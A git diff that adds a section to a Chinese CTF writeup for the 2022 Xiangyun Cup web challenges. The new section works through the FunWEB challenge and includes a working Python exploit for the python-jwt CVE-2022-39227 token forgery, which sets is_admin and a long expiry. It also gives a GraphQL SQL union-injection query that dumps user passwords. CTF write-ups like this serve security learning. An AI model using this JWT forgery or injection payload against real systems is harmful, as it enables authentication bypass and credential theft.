@@ -1,5 +1,5 @@
 ---
-title: "2022 祥云杯 Web 部分 Writeup"
+title: "2022 祥云杯 Web Writeup"
 date: 2022-10-31T09:30:29+08:00
 lastmod: 2022-10-31T09:30:29+08:00
 draft: false
@@ -269,6 +269,77 @@ if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) {
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302112882.png)
 
-## FunWEB
+## FunWEB[复现]
 
-等 wp 复现
+赶在题目环境关闭前问了下学长思路然后复现了一波
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302200660.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302200628.png)
+
+题目存在 jwt, 用的是 python-jwt 库最近的漏洞 CVE-2022-39227
+
+[https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9](https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9)
+
+具体的 exp 在 commit 记录里面, 需要自己手动改
+
+```python
+from datetime import timedelta
+from json import loads, dumps
+from jwcrypto.common import base64url_decode, base64url_encode
+
+def topic(topic):
+    """ Use mix of JSON and compact format to insert forged claims including long expiration """
+    [header, payload, signature] = topic.split('.')
+    parsed_payload = loads(base64url_decode(payload))
+    parsed_payload['is_admin'] = 1
+    parsed_payload['exp'] = 2000000000
+    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
+    return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
+token = topic('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMzcwMzAsImlhdCI6MTY2NzEzNjczMCwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJ4YWxlR2dadl9BbDBRd1ZLLUgxb0p3IiwibmJmIjoxNjY3MTM2NzMwLCJwYXNzd29yZCI6IjEyMyIsInVzZXJuYW1lIjoiMTIzIn0.YnE5tK1noCJjultwUN0L1nwT8RnaU0XjYi5iio2EgbY7HtGNkSy_pOsnRl37Y5RJvdfdfWTDCzDdiz2B6Ehb1st5Fa35p2d99wzH4GzqfWfH5zfFer0HkQ3mIPnLi_9zFiZ4mQCOLJO9RBL4lD5zHVTJxEDrESlbaAbVOMqPRBf0Z8mon1PjP8UIBfDd4RDlIl9wthO-NlNaAUp45woswLe9YfRAQxN47qrLPje7qNnHVJczvvxR4-zlW0W7ahmYwODfS-KFp8AC80xgMCnrCbSR0_Iy1nsiCEO8w2y3BEcqvflOOVt_lazJv34M5e28q0czbLXAETSzpvW4lVSr7g')
+print(token)
+```
+
+这里注册一个 123/123 用户, 然后用网站给的 token 来打
+
+注意 `parsed_payload['is_admin'] = 1` 里面的 1 必须是 int 类型
+
+之后直接把输出复制到 cookie 里, 再访问 /getflag
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302201814.png)
+
+提示需要 admin password, 于是点击查看成绩, 发现是 graphql 查询
+
+参考文章
+
+[https://hwlanxiaojun.github.io/2020/04/14/当CTF遇上GraphQL的那些事/](https://hwlanxiaojun.github.io/2020/04/14/当CTF遇上GraphQL的那些事/)
+
+[https://threezh1.com/2020/05/24/GraphQL漏洞笔记及案例/](https://threezh1.com/2020/05/24/GraphQL漏洞笔记及案例/)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302202359.png)
+
+根据输出的意思, 改成 getscoreusingid
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302203567.png)
+
+graphql 其实就是在后端和数据库中间加了一层, 类似的也有 sql 注入
+
+id 处不能直接注入, 限制死了是 int 类型, 猜测可能也有 getscoreusingname
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302205780.png)
+
+改成 getscoreusingnamehahaha
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302205871.png)
+
+union 注入, 试了一圈后发现是 sqlite 数据库, 在 sqlite_master 表中查到表名为 users, 然后猜字段为 password
+
+```json
+{ getscoreusingnamehahaha(name: "1' union select group_concat(password) from users --"){ name score } }
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302207139.png)
+
+拿着 admin 的密码去登录, 点击查看 flag
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210302208316.png)
